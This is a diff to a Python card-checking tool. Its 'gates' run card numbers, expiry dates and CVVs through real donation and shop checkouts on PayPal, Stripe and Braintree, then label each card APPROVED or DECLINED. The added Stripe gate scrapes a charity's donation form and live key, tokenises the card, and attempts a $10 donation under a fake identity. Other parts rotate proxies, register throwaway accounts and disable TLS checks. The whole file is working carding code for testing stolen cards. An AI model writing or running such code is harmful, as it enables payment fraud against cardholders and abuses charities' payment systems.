@@ -28,7 +28,7 @@ def format_proxy(proxy):
     return None
 
 # ============================================================================
-# Simple random user‑agent generator (no external dependency)
+# Simple random user‑agent generator
 # ============================================================================
 def generate_user_agent():
     ua_list = [
@@ -49,13 +49,9 @@ PAYPAL_SITE = "http://bavashdesigns.com"
 PAYPAL_AMOUNT = 0.05
 
 # ============================================================================
-# WORKING PAYPAL GATE (uses 2africa.org)
+# WORKING PAYPAL GATE (2africa.org)
 # ============================================================================
 def check_paypal_working(cc, proxy=None):
-    """
-    Checks a card on 2africa.org PayPal donation.
-    Returns (message, status) where status is 'APPROVED' or 'DECLINED' or 'ERROR'.
-    """
     try:
         cc = cc.strip()
         parts = cc.split('|')
@@ -77,7 +73,6 @@ def check_paypal_working(cc, proxy=None):
             headers = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
             r = s.get(SITE_URL, headers=headers, timeout=30)
             html = r.text
-
             if 'givewp-route=donation-form-view' in html and 'givewp-route-signature' not in html:
                 fid = re.search(r'form-id[=]+(\d+)', html)
                 if fid:
@@ -85,7 +80,6 @@ def check_paypal_working(cc, proxy=None):
                     r2 = s.get(iframe, headers=headers, timeout=30)
                     html = r2.text
 
-            # Try multiple patterns for form fields
             fp = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
             if not fp:
                 fp = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', html)
@@ -223,7 +217,6 @@ def check_paypal_working(cc, proxy=None):
                     headers=headers, data=mp2, timeout=30)
         txt = r2.text
 
-        # Parse response
         if 'true' in txt or 'sucsess' in txt or 'COMPLETED' in txt:
             return "Charged $1.00", "APPROVED"
         decline_keywords = [
@@ -248,52 +241,216 @@ check_paypal_fixed = check_paypal_working
 check_paypal_general = check_paypal_working
 
 # ============================================================================
-# STRIPE GATE (External API) - works via API
+# LOCAL STRIPE GATE (bambifoundation.org)
 # ============================================================================
-STRIPE_SITE = "newzealandtrends.com"
-STRIPE_API_URL = "https://stripe-checker-production-e6a0.up.railway.app/v1/stripe/auth"
-
 def check_stripe_api(cc, proxy=None):
     """
-    Check a card using the external Stripe API.
+    Stripe gate using bambifoundation.org.
     Returns (message, status).
     """
     try:
         cc = cc.strip()
-        parts = cc.split('|')
+        parts = re.split(r'[ |/]', cc)
         if len(parts) < 4:
             return "Invalid format", "ERROR"
-        cc_num, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
+        c = parts[0]
+        mm = parts[1]
+        ex = parts[2]
+        cvc = parts[3]
 
-        import urllib.parse
-        param_string = f"site={STRIPE_SITE}&cc={cc_num}%7C{mm}%7C{yy}%7C{cvv}"
-        url = f"{STRIPE_API_URL}/{param_string}"
+        # Normalize year
+        if len(ex) == 2:
+            yy = ex
+        elif len(ex) == 4:
+            yy = ex[2:]
+        else:
+            yy = ex
+        if len(yy) == 4:
+            yy = yy[2:]
 
+        user_agent = generate_user_agent()
         session = requests.Session()
         if proxy:
             session.proxies.update(format_proxy(proxy))
+        session.verify = False
 
-        response = session.get(url, timeout=30, verify=False)
-        response.raise_for_status()
-        data = response.json()
+        # 1. Get form data
+        headers = {'user-agent': user_agent}
+        resp = session.get('https://bambifoundation.org/donate-now/', headers=headers, timeout=30)
+        html = resp.text
 
-        result = data.get('result', '').lower()
-        if 'charged' in result or 'approved' in result or 'success' in result:
-            return result, "APPROVED"
-        else:
-            return result, "DECLINED"
+        # Extract required fields
+        form_hash = re.search(r'name="give-form-hash" value="(.*?)"', html).group(1)
+        form_prefix = re.search(r'name="give-form-id-prefix" value="(.*?)"', html).group(1)
+        form_id = re.search(r'name="give-form-id" value="(.*?)"', html).group(1)
+        pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', html).group(1)
 
-    except requests.exceptions.Timeout:
-        return "Timeout", "ERROR"
-    except requests.exceptions.RequestException as e:
-        return f"Request error: {str(e)}", "ERROR"
-    except json.JSONDecodeError:
-        return "Invalid API response", "ERROR"
+        # 2. Initial donation setup (POST to admin-ajax)
+        headers = {
+            'origin': 'https://bambifoundation.org',
+            'referer': 'https://bambifoundation.org/donate-now/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+            'x-requested-with': 'XMLHttpRequest',
+        }
+        data = {
+            'give-honeypot': '',
+            'give-form-id-prefix': form_prefix,
+            'give-form-id': form_id,
+            'give-form-title': 'Give a Donation',
+            'give-current-url': 'https://bambifoundation.org/donate-now/',
+            'give-form-url': 'https://bambifoundation.org/donate-now/',
+            'give-form-minimum': '10.00',
+            'give-form-maximum': '999999.99',
+            'give-form-hash': form_hash,
+            'give-price-id': 'custom',
+            'give-amount': '10.00',
+            'give_tributes_type': 'DrGaM Of',
+            'give_tributes_show_dedication': 'no',
+            'give_tributes_radio_type': 'In Honor Of',
+            'give_tributes_first_name': '',
+            'give_tributes_last_name': '',
+            'give_tributes_would_to': 'send_mail_card',
+            'give-tributes-mail-card-personalized-message': '',
+            'give_tributes_mail_card_notify_first_name': '',
+            'give_tributes_mail_card_notify_last_name': '',
+            'give_tributes_address_country': 'US',
+            'give_tributes_mail_card_address_1': '',
+            'give_tributes_mail_card_address_2': '',
+            'give_tributes_mail_card_city': '',
+            'give_tributes_address_state': 'MI',
+            'give_tributes_mail_card_zipcode': '',
+            'give_stripe_payment_method': '',
+            'payment-mode': 'stripe',
+            'give_first': 'drgam',
+            'give_last': 'drgam',
+            'give_email': 'lolipnp@gmail.com',
+            'give_comment': '',
+            'card_name': 'drgam',
+            'billing_country': 'US',
+            'card_address': 'drgam sj',
+            'card_address_2': '',
+            'card_city': 'tomrr',
+            'card_state': 'NY',
+            'card_zip': '10090',
+            'give_action': 'purchase',
+            'give-gateway': 'stripe',
+            'action': 'give_process_donation',
+            'give_ajax': 'true',
+        }
+        session.post('https://bambifoundation.org/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=30)
+
+        # 3. Create Stripe payment method
+        stripe_headers = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        }
+        data = f'type=card&billing_details[name]=drgam++drgam+&billing_details[email]=lolipnp%40gmail.com&billing_details[address][line1]=drgam+sj&billing_details[address][line2]=&billing_details[address][city]=tomrr&billing_details[address][state]=NY&billing_details[address][postal_code]=10090&billing_details[address][country]=US&card[number]={c}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=d4c7a0fe-24a0-4c2f-9654-3081cfee930d03370a&muid=3b562720-d431-4fa4-b092-278d4639a6f3fd765e&sid=70a0ddd2-988f-425f-9996-372422a311c454628a&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+split-card-element&referrer=https%3A%2F%2Fhigherhopesdetroit.org&time_on_page=85758&client_attribution_metadata[client_session_id]=c0e497a5-78ba-4056-9d5d-0281586d897a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&key={pk_live}&_stripe_account=acct_1C1iK1I8d9CuLOBr&radar_options'
+        resp = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=data, timeout=30)
+        payment_method_id = resp.json()['id']
+
+        # 4. Complete donation with Stripe payment method
+        headers = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+            'cache-control': 'max-age=0',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://bambifoundation.org',
+            'referer': 'https://bambifoundation.org/donate-now/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        }
+        params = {'payment-mode': 'stripe', 'form-id': form_id}
+        data = {
+            'give-honeypot': '',
+            'give-form-id-prefix': form_prefix,
+            'give-form-id': form_id,
+            'give-form-title': 'Give a Donation',
+            'give-current-url': 'https://bambifoundation.org/donate-now/',
+            'give-form-url': 'https://bambifoundation.org/donate-now/',
+            'give-form-minimum': '10.00',
+            'give-form-maximum': '999999.99',
+            'give-form-hash': form_hash,
+            'give-price-id': 'custom',
+            'give-amount': '10.00',
+            'give_tributes_type': 'In Honor Of',
+            'give_tributes_show_dedication': 'no',
+            'give_tributes_radio_type': 'Drgam Of',
+            'give_tributes_first_name': '',
+            'give_tributes_last_name': '',
+            'give_tributes_would_to': 'send_mail_card',
+            'give-tributes-mail-card-personalized-message': '',
+            'give_tributes_mail_card_notify_first_name': '',
+            'give_tributes_mail_card_notify_last_name': '',
+            'give_tributes_address_country': 'US',
+            'give_tributes_mail_card_address_1': '',
+            'give_tributes_mail_card_address_2': '',
+            'give_tributes_mail_card_city': '',
+            'give_tributes_address_state': 'MI',
+            'give_tributes_mail_card_zipcode': '',
+            'give_stripe_payment_method': payment_method_id,
+            'payment-mode': 'stripe',
+            'give_first': 'drgam',
+            'give_last': 'drgam',
+            'give_email': 'lolipnp@gmail.com',
+            'give_comment': '',
+            'card_name': 'drgam',
+            'billing_country': 'US',
+            'card_address': 'drgam sj',
+            'card_address_2': '',
+            'card_city': 'tomrr',
+            'card_state': 'NY',
+            'card_zip': '10090',
+            'give_action': 'purchase',
+            'give-gateway': 'stripe',
+        }
+        resp = session.post('https://bambifoundation.org/donate-now/', params=params, headers=headers, data=data, timeout=30, allow_redirects=True)
+        text = resp.text
+
+        # Parse response
+        if 'Thank you' in text or 'succeeded' in text:
+            return "Charged $10.00", "APPROVED"
+        if 'Your card was declined.' in text:
+            return "Card declined", "DECLINED"
+        if 'Your card has insufficient funds.' in text:
+            return "Insufficient funds", "DECLINED"
+        if 'Your card number is incorrect.' in text:
+            return "Invalid card number", "DECLINED"
+        if 'expired' in text.lower():
+            return "Expired card", "DECLINED"
+        error_match = re.search(r'<div class="give_error[^>]*>(.*?)</div>', text, re.DOTALL)
+        if error_match:
+            error_msg = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
+            return f"Error: {error_msg}", "DECLINED"
+        if 'error' in text.lower():
+            return "Unknown error (see details)", "DECLINED"
+        return f"Unknown response: {text[:200]}", "ERROR"
+
     except Exception as e:
         return f"Exception: {str(e)[:100]}", "ERROR"
 
 # ============================================================================
-# BRAINTREE GATE (Local site - fixed)
+# BRAINTREE GATE (shop.trifectanutrition.com)
 # ============================================================================
 def check_braintree(cc, proxy=None):
     """
@@ -309,7 +466,6 @@ def check_braintree(cc, proxy=None):
         mm = parts[1]
         ex = parts[2]
         cvc = parts[3]
-        # Normalize year
         if len(ex) == 2:
             yy = ex
         elif len(ex) == 4:
@@ -321,7 +477,6 @@ def check_braintree(cc, proxy=None):
         if len(yy) != 2:
             yy = yy[-2:]
 
-        # Create random user
         username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
         email = f"{username}@gmail.com"
         user_agent = generate_user_agent()
@@ -337,12 +492,11 @@ def check_braintree(cc, proxy=None):
         session.post('https://shop.trifectanutrition.com/wp-json/tf/v1/fb/user/create/email',
                      headers=headers, json=json_data, timeout=30)
 
-        # 2. Get address nonce – the nonce may be in a hidden input or in a script
+        # 2. Get address nonce – using multiple patterns
         resp = session.get('https://shop.trifectanutrition.com/my-account/edit-address/billing/',
                            headers=headers, timeout=30)
         html = resp.text
         address_nonce = None
-        # Try multiple patterns
         patterns = [
             r'name="woocommerce-edit-address-nonce" value="(.*?)"',
             r'name="woocommerce-edit-address-nonce"\s+value="([^"]+)"',
@@ -381,13 +535,12 @@ def check_braintree(cc, proxy=None):
                            headers=headers, timeout=30)
         html = resp.text
         payment_nonce = None
-        for pat in patterns:  # same pattern for payment nonce
+        for pat in patterns:
             match = re.search(pat.replace('edit-address', 'add-payment-method'), html)
             if match:
                 payment_nonce = match.group(1)
                 break
         if not payment_nonce:
-            # Try more generic pattern
             match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', html)
             if match:
                 payment_nonce = match.group(1)
@@ -467,7 +620,6 @@ def check_braintree(cc, proxy=None):
                             headers=headers, data=data, timeout=30)
         text = resp.text
 
-        # Parse result
         if 'added' in text or 'Payment method successfully added.' in text:
             return "Approved ✅", "APPROVED"
         elif 'Duplicate card exists' in text:
@@ -489,8 +641,7 @@ def check_braintree(cc, proxy=None):
         return f"Exception: {str(e)[:100]}", "ERROR"
 
 # ============================================================================
-# The following gates are disabled because the Onyx API is not working.
-# They are replaced with dummy functions that return an error.
+# Dummy functions for Onyx gates (API down)
 # ============================================================================
 def _onyx_unavailable(gate_name):
     return lambda cc, proxy=None: (f"{gate_name} unavailable (Onyx API down)", "ERROR")
